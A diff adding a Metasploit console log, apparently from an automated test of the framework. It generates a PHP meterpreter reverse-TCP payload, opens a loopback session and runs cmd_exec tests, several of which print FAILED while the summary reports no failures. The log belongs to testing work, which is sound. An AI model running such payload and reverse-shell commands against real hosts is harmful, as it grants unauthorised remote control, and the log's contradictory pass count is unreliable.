@@ -1,0 +1,34 @@
+use php/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-1876-a8d9a2.php -f raw lport=6034 lhost=127.0.0.1
+[*] Writing 1110 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-1876-a8d9a2.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 33
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6034 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 23 opened (127.0.0.1:6034 -> 127.0.0.1:50118 ) at 2022-01-19 00:57:50 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=23 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 23
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+[-] FAILED: should return the result of echo with double quotes
+[-] Exception: Errno::ECONNRESET : An existing connection was forcibly closed by the remote host.
+[*] Starting cmd_exec stderr tests
+[-] FAILED: should return the stderr output
+[-] Exception: Errno::ECONNRESET : An existing connection was forcibly closed by the remote host.
+[*] Starting cmd_exec tests
+[*] meterpreter?
+[-] FAILED: should return the result of echo
+[-] Exception: Errno::ECONNRESET : An existing connection was forcibly closed by the remote host.
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Testing complete in 0.2488729
+[*] Passed: 4; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> 
